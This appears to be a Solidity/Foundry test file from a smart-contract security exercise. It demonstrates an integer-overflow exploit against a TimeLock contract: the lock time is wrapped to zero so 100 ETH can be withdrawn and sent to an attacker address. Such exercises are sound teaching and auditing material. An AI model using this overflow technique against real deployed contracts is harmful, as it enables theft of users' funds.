//SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/arithmetic-overflows-1/TimeLock.sol";

/**
@dev run "forge test --match-contract AO1" 
*/
contract TestAO1 is Test {
    uint256 public constant VICTIM_DEPOSIT = 100 ether;
    uint256 constant MAX_UINT = 2 ** 256 - 1;

    TimeLock timeLock;

    address deployer;
    address victim;
    address attacker;

    uint256 init_bal_victim;
    uint256 init_bal_attacker;

    function setUp() public {
        deployer = address(1);
        victim = address(2);
        attacker = address(3);

        vm.deal(victim, 1000 ether);
        vm.deal(attacker, 1000 ether);
        init_bal_victim = address(victim).balance;
        init_bal_attacker = address(attacker).balance;

        vm.prank(deployer);
        timeLock = new TimeLock();

        vm.prank(victim);
        timeLock.depositETH{value: VICTIM_DEPOSIT}();

        uint256 curr_bal_victim = address(victim).balance;
        assertEq(curr_bal_victim, init_bal_victim - VICTIM_DEPOSIT);

        uint256 victim_deposited = timeLock.getBalance(victim);
        assertEq(victim_deposited, VICTIM_DEPOSIT);
    }

    function test() public {
        uint256 currLockTime = timeLock.getLocktime(victim);
        uint256 timeToAdd = MAX_UINT - currLockTime + 1;

        vm.startPrank(victim);
        timeLock.increaseMyLockTime(timeToAdd);
        timeLock.withdrawETH();
        (bool success, ) = attacker.call{value: VICTIM_DEPOSIT}("");
        require(success, "Sending balance to atacker failed!!!");
        vm.stopPrank();

        // Timelock contract victim's balance supposed to be 0 (withdrawn successfuly)
        uint256 victim_deposited_after = timeLock.getBalance(victim);
        assertEq(victim_deposited_after, 0);

        // Attacker's should steal successfully the 100 ETH
        uint256 curr_bal_attacker = address(attacker).balance;
        assertEq(curr_bal_attacker, init_bal_attacker + VICTIM_DEPOSIT);
    }
}
